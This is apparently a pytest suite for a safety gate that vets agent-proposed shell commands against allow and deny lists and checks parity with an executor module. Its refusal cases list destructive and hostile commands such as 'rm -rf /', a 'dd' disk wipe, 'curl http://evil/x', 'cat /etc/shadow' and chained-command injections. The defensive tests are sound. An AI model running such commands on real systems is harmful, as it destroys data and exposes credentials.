"""node_action_plan: the agent-side twin of the executor's safety gate.

The plan stamped into the change record at open() has to be the same shape the
executor will run after approval, so these tests cover both the gate itself and
its parity with ``executor/nodeaction.py`` — a widened allowlist on one side
only is the failure mode that lets an approved record run something the
reviewer never saw.
"""

import importlib.util
import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import node_action_plan
from node_action_plan import (
    build_command_prompt, normalize_plan, parse_command_plan, validate_command,
    validate_plan,
)


def _load_executor_nodeaction():
    """Import executor/nodeaction.py under a private name (both trees ship a
    top-level ``nodeaction``/``entrypoint``, so a bare import would collide)."""
    path = os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        "executor", "nodeaction.py",
    )
    spec = importlib.util.spec_from_file_location("_executor_nodeaction_for_parity", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


_executor = _load_executor_nodeaction()


# ---- the safety gate ---------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "chmod 600 /root/.ssh/config",
    "chown root:root /etc/cfop/config.yaml",
    "chgrp docker /var/run/docker.sock",
    "install -d -m 0750 /etc/cfop",
    "touch /etc/cfop/.keep",
    "ln -s /etc/foo /etc/bar",
    "mkdir -p /etc/cfop",
    "restorecon -R /etc/ssh",
    "chattr +i /etc/resolv.conf",
    "sudo -n chmod 0600 /root/.ssh/config",
    "systemctl restart sshd",
    "systemctl reload nginx",
    "systemctl reload-or-restart nginx",
    "systemctl daemon-reload",
    "systemctl is-active sshd",
    "sudo -n systemctl enable sshd",
])
def test_validate_command_allows_safe(cmd):
    ok, reason = validate_command(cmd)
    assert ok, reason


@pytest.mark.parametrize("cmd,needle", [
    ("rm -rf /root/.ssh", "denied"),
    ("dd if=/dev/zero of=/dev/sda", "denied"),
    ("reboot", "denied"),
    ("kill 1234", "denied"),
    ("mv /etc/a /etc/b", "denied"),
    ("curl http://evil/x", "denied"),
    ("sed -i s/a/b/ /etc/hosts", "denied"),
    ("cat /etc/shadow", "allowlist"),
    ("chmod 600 /a && rm -rf /b", "metacharacter"),
    ("chmod 600 /a; reboot", "metacharacter"),
    ("chmod 600 /a | tee /b", "metacharacter"),
    ("chmod 600 $(cat /etc/x)", "metacharacter"),
    ("chmod 600 /etc/ssh/*", "metacharacter"),
    ("chmod 600 ~/x", "metacharacter"),
    ("chmod 600 /a > /b", "metacharacter"),
    ("chmod 600 /a\nreboot", "metacharacter"),
    ("systemctl stop sshd", "verb not allowed"),
    ("systemctl mask sshd", "verb not allowed"),
    ("systemctl", "verb not allowed"),
    ("sudo chmod 600 /a", "sudo -n"),
    ("sudo -S chmod 600 /a", "sudo -n"),
    ("sudo -n", "sudo -n"),
    ("", "empty"),
    ("   ", "empty"),
])
def test_validate_command_refuses_unsafe(cmd, needle):
    ok, reason = validate_command(cmd)
    assert not ok
    assert needle in reason


def test_validate_command_handles_none():
    ok, reason = validate_command(None)
    assert not ok and "empty" in reason


def test_validate_command_refuses_unparseable_quotes():
    ok, reason = validate_command("chmod 600 '/etc/unclosed")
    assert not ok
    assert "unparseable" in reason


class TestValidatePlan:
    def test_accepts_plan_at_the_limit(self):
        ok, reason = validate_plan(["chmod 600 /a"] * 4)
        assert ok, reason

    def test_rejects_too_many(self):
        ok, reason = validate_plan(["chmod 600 /a"] * 5)
        assert not ok and "too many" in reason

    def test_rejects_empty(self):
        ok, reason = validate_plan([])
        assert not ok and "no commands" in reason

    def test_rejects_when_any_command_is_unsafe(self):
        ok, reason = validate_plan(["chmod 600 /a", "rm -rf /b"])
        assert not ok and "denied" in reason


# ---- plan parsing ------------------------------------------------------------

class TestParseCommandPlan:
    def test_bare_json(self):
        plan = parse_command_plan('{"host": "web1", "commands": ["chmod 600 /a"], "explanation": "fix perms"}')
        assert plan == {"host": "web1", "commands": ["chmod 600 /a"], "explanation": "fix perms"}

    def test_fenced_json(self):
        reply = 'Sure!\n```json\n{"host": "web1", "commands": ["chmod 600 /a"]}\n```\nHope that helps.'
        assert parse_command_plan(reply)["commands"] == ["chmod 600 /a"]

    def test_fenced_without_language_tag(self):
        reply = '```\n{"host": "", "commands": []}\n```'
        assert parse_command_plan(reply) == {"host": "", "commands": []}

    def test_prose_around_bare_json(self):
        reply = 'Here is the plan: {"commands": ["mkdir -p /etc/cfop"]} — run it after approval.'
        assert parse_command_plan(reply)["commands"] == ["mkdir -p /etc/cfop"]

    @pytest.mark.parametrize("reply", [
        "",
        None,
        "no json here at all",
        "} {",                              # closing brace before opening
        "{not valid json}",
        '["chmod 600 /a"]',                 # a list, not an object
        '{"host": "web1"}',                 # no commands key
        '{"commands": "chmod 600 /a"}',     # commands not a list
        '{"commands": ["chmod 600 /a", 7]}',  # non-string command
    ])
    def test_rejects_unusable_replies(self, reply):
        assert parse_command_plan(reply) is None

    def test_bare_json_uses_outermost_braces(self):
        reply = 'text {"commands": ["chmod 600 /a"], "nested": {"k": "v"}} tail'
        plan = parse_command_plan(reply)
        assert plan["nested"] == {"k": "v"}


class TestNormalizePlan:
    def test_full_plan(self):
        assert normalize_plan({
            "host": " web1 ",
            "commands": ["chmod 600 /a"],
            "explanation": "fix perms",
        }) == {"host": "web1", "commands": ["chmod 600 /a"], "explanation": "fix perms"}

    def test_missing_fields_become_empty(self):
        assert normalize_plan({}) == {"host": "", "commands": [], "explanation": ""}

    def test_none_host_and_commands_coerced(self):
        assert normalize_plan({"host": None, "commands": None, "explanation": None}) == {
            "host": "", "commands": [], "explanation": "",
        }

    def test_non_string_commands_stringified(self):
        assert normalize_plan({"commands": [7, None]})["commands"] == ["7", "None"]


class TestBuildCommandPrompt:
    def test_includes_recommendation_and_target(self):
        prompt = build_command_prompt({
            "payload": {
                "recommendation": "tighten ssh config perms",
                "target": {"host": "web1", "path": "/root/.ssh/config"},
                "rendered_context": "sshd refuses to start",
            }
        })
        assert "tighten ssh config perms" in prompt
        assert '"host": "web1"' in prompt
        assert "sshd refuses to start" in prompt
        assert '"commands"' in prompt  # the requested reply shape

    def test_context_truncated(self):
        prompt = build_command_prompt({"payload": {"rendered_context": "x" * 9000}})
        assert "x" * 4000 in prompt
        assert "x" * 4001 not in prompt

    def test_tolerates_missing_payload(self):
        assert "Recommendation:" in build_command_prompt({})


# ---- parity with the executor ------------------------------------------------

class TestExecutorParity:
    """``node_action_plan`` documents that it mirrors ``executor/nodeaction.py``."""

    @pytest.mark.parametrize("name", [
        "_ALLOWED_BINARIES", "_ALLOWED_SYSTEMCTL_VERBS", "_DENY_BINARIES", "_MAX_COMMANDS",
    ])
    def test_gate_constants_match(self, name):
        assert getattr(node_action_plan, name) == getattr(_executor, name)

    def test_metachar_pattern_matches(self):
        assert node_action_plan._METACHARS.pattern == _executor._METACHARS.pattern

    @pytest.mark.parametrize("cmd", [
        "chmod 600 /root/.ssh/config",
        "sudo -n systemctl restart sshd",
        "rm -rf /",
        "systemctl stop sshd",
        "chmod 600 /a && reboot",
        "",
    ])
    def test_verdicts_agree(self, cmd):
        assert validate_command(cmd)[0] == _executor.validate_command(cmd)[0]
